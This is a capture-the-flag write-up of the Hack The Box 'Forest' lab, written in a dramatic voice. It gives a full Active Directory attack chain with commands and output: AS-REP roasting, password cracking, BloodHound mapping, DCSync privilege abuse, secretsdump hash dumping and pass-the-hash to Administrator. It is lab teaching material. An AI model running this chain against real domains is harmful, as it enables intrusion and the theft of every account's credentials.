
# HTB-Forest

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/forest.jfif" />


---
## Intro

"The trees are thick, but the roots are hollow. All it takes is one spark in the right crack to burn the whole canopy down."

Target IP 10.129.95.210
My IP 10.10.14.98

## nmap & enumeration

Initiating baseline scan. Standard enumeration sequence: cycling through DIG, RPC,  etc...

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ nmap -p- --min-rate 10000 10.129.95.210
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-16 07:15 CDT
Warning: 10.129.95.210 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.95.210
Host is up (0.0086s latency).
Not shown: 65500 closed tcp ports (reset)
PORT      STATE    SERVICE
53/tcp    open     domain
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5985/tcp  open     wsman
9389/tcp  open     adws
.....
47001/tcp open     winrm
.....
```

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.129.95.210
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-16 07:18 CDT
Nmap scan report for 10.129.95.210
Host is up (0.0076s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-16 12:25:41Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-05-16T05:25:45-07:00
| smb2-time: 
|   date: 2026-05-16T12:25:46
|_  start_date: 2026-05-16T12:05:22
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ nmap -sU -p- --min-rate 10000 10.129.95.210
Warning: 10.129.95.210 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.95.210
Host is up (0.0077s latency).
Not shown: 65458 open|filtered udp ports (no-response), 73 closed udp ports (port-unreach)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap
```

DNS - UDP/TCP 53
```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ dig @10.129.95.210 htb.local

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.129.95.210 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64296
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: d6c0fa3ddfb35883 (echoed)
;; QUESTION SECTION:
;htb.local.			IN	A

;; ANSWER SECTION:
htb.local.		600	IN	A	10.129.95.210

;; Query time: 9 msec
;; SERVER: 10.129.95.210#53(10.129.95.210) (UDP)
;; WHEN: Sat May 16 08:10:12 CDT 2026
;; MSG SIZE  rcvd: 66



┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ dig @10.129.95.210 forest.htb.local

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.129.95.210 forest.htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54009
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: a366d8e76ef1ed7a (echoed)
;; QUESTION SECTION:
;forest.htb.local.		IN	A

;; ANSWER SECTION:
forest.htb.local.	3600	IN	A	10.129.95.210

;; Query time: 6 msec
;; SERVER: 10.129.95.210#53(10.129.95.210) (UDP)
;; WHEN: Sat May 16 08:10:39 CDT 2026
;; MSG SIZE  rcvd: 73



┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ dig axfr @10.129.95.210 htb.local

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr @10.129.95.210 htb.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

SMB - TCP 445
```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ smbmap -H 10.129.95.210
[+] IP: 10.129.95.210:445	Name: 10.129.95.210     


┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~]
└──╼ [★]$ smbmap -H 10.129.95.210 -u cat -p cat
[!] Authentication error on 10.129.95.210


┌─[root@htb-u5yqproecw]─[/home/justdave]
└──╼ #smbclient -N -L 10.129.95.210
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
RPC - TCP 445
```bash
rpcclient -U "" -N 10.129.95.210
rpcclient $>

I can query via Commands:
enumdomusers - enum users
enumdomgroups - enum groups
querygroup 0x200 - query group for its members
querygroupmem 0x200 - 
queryuser 0x1f4
```

Armed with the ghost-names scraped from the fog, I spun up Impacket. 
It’s a clean, clinical tool for a dirty job—perfect for executing the silent ritual of AS-REP Roasting 
against the grid, siphoning hashes out of the dark before the system even realizes it’s bleeding.

```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~/Desktop]
└──╼ [★]$ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.129.95.210 htb.local/${user} | grep -v Impacket; done
[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:72c31579aed8224bcde4695a13553d8d$639745e26586ba3e529b40ffe1f39530da0f8911cd1099f0bc4fbe36cb114814f7baa2f8fe6c52555b93b47dead7cb5f626fdff158feed5e7d49e579ab3c9d861172f412c7539c6b26843fea2c3eec603fb4cc68372c0c174795799f8b7fb4453f4ba68d577704a5279161c71ea93fcecab76bf6c18c0ac91801098dff75741371b1a3bf10697d259568de9e5431d2612fb023352d5bfdcfe8b39b1b7a6969a4b0d9cb6980162026379756855149a2c3c4607a4ffbc1381265fc2c877335f2108f587fb1c944a00e34fd9682a0f3f111caad7005037f7f18a54e07bc43dc3588f36b5bf54750

```
Now we crack the seal. 
It’s time to feed those siphoned hashes into the rig and bleed out the plain-text password.

```bash
gunzip -d rockyou.txt.gz
Copy all the TGT for the svc account in a file, called hash, for example
┌─[root@htb-u5yqproecw]─[/home/justdave/Desktop]
└──╼ #hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
....
$krb5asrep$23$svc-alfresco@HTB.LOCAL:72c31579aed8224bcde4695a13553d8d$639745e26586ba3e529b40ffe1f39530da0f8911cd1099f0bc4fbe36cb114814f7baa2f8fe6c52555b93b47dead7cb5f626fdff158feed5e7d49e579ab3c9d861172f412c7539c6b26843fea2c3eec603fb4cc68372c0c174795799f8b7fb4453f4ba68d577704a5279161c71ea93fcecab76bf6c18c0ac91801098dff75741371b1a3bf10697d259568de9e5431d2612fb023352d5bfdcfe8b39b1b7a6969a4b0d9cb6980162026379756855149a2c3c4607a4ffbc1381265fc2c877335f2108f587fb1c944a00e34fd9682a0f3f111caad7005037f7f18a54e07bc43dc3588f36b5bf54750:s3rvice
```
so it is -> svc-alfresco:s3rvice
```bash
┌─[✗]─[root@htb-u5yqproecw]─[/home/justdave/Desktop]
└──╼ #evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> cat user.txt
61c14572042e990af5694488ce2244a6
```
I pulled SharpHound.exe down from the SpecterOps repository onto my Kali
https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe

While I sat in the shadows of my terminal, the payload was already nesting on the remote machine, ready to rip the veil off the target's internal architecture.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata> cd local
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local> cd temp
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> upload SharpHound.exe
                                 
Info: Uploading /home/justdave/Desktop/SharpHound.exe to C:\Users\svc-alfresco\appdata\local\temp\SharpHound.exe
                                        
Data: 1395368 bytes of 1395368 bytes copied
                                        
Info: Upload successful!
```

I hit execute - The hunt is on.

```bash
Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> .\SharpHound.exe -c All
2026-05-16T06:53:06.0933143-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2026-05-16T06:53:06.3433106-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-05-16T06:53:06.3589347-07:00|INFORMATION|Initializing SharpHound at 6:53 AM on 5/16/2026
2026-05-16T06:53:06.7652479-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2026-05-16T06:53:06.7965204-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2026-05-16T06:53:07.1870636-07:00|INFORMATION|Beginning LDAP search for htb.local
2026-05-16T06:53:07.3745879-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-05-16T06:53:07.3745879-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-05-16T06:53:37.4527811-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
2026-05-16T06:53:50.6871585-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-05-16T06:53:50.7496621-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-05-16T06:53:50.8746631-07:00|INFORMATION|Status: 161 objects finished (+161 3.744186)/s -- Using 48 MB RAM
2026-05-16T06:53:50.8746631-07:00|INFORMATION|Enumeration finished in 00:00:43.6880252
2026-05-16T06:53:50.9840344-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2026-05-16T06:53:51.0152849-07:00|INFORMATION|SharpHound Enumeration Completed at 6:53 AM on 5/16/2026! Happy Graphing!

```
The data-harvest was complete.
I pulled the raw loot back across the wire, dragging the compressed network layout down
onto my Kali rig.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> download 20260516065349_BloodHound.zip

```
On my machine
```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~/Desktop/forest]
└──╼ [★]$ git clone https://github.com/BloodHoundAD/BloodHound.git
```
(as ROOT)
neo4j console
if needed user / password is neo4j
run bloodhound and upload the zip file

search for SVC-ALFRESCO@HTB.LOCAL - mark as owned and look at his groups, one is 
Account Operators that can create and modify users and add them to non protected groups
One of the paths shows that the Exchange Windows Permissions group has WriteDacl privileges on the 
Domain. The WriteDACL privilege allows a user to add ACLs to an object. We can add users to this group 
and give them DCSync privileges. 
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user cat miao123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" cat /add
The command completed successfully

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup "Remote Management Users" cat /add
The command completed successfully.
```
Time to become the king.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> upload PowerView.ps1

we can use the Add-ObjectACL with cat's credentials, and give him DCSync rights.
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $pass = convertto-securestring 'miao123!' -asplain -force
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $cred = new-object system.management.automation.pscredential('htb\cat', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-ObjectACL -PrincipalIdentity cat -Credential $cred -Rights DCSync
```


```bash
┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-u5yqproecw]─[~/Desktop]
└──╼ [★]$ impacket-secretsdump htb/cat@10.129.95.210
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password: miao123!
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
cat:10102:aad3b435b51404eeaad3b435b51404ee:0b7135f290ae4aa9a76394f7c67677a0:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:9794cd2c278d9a4792f0a31b1a52266c:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
cat:aes256-cts-hmac-sha1-96:4f1a2a239275028d0156b3df46dbf904977a1e51b49582f07e663c95056d5aae
cat:aes128-cts-hmac-sha1-96:a71be91569a170e4401c383d67485573
cat:des-cbc-md5:8f29c4dc4ab69ddc
FOREST$:aes256-cts-hmac-sha1-96:f0f21b5339195d29e003c47a81510d281a669dee79eac2b835e2170d83c99bf0
FOREST$:aes128-cts-hmac-sha1-96:087cb38bfa73d38adb756632465c60b2
FOREST$:des-cbc-md5:d03e57cd643ba7b0
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```

impacket-psexec administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

C:\Users\Administrator\Desktop> type root.txt
d2fedf82930d63c3a1bb94a479ffa246

System compromised. Walk away before the smoke clears.
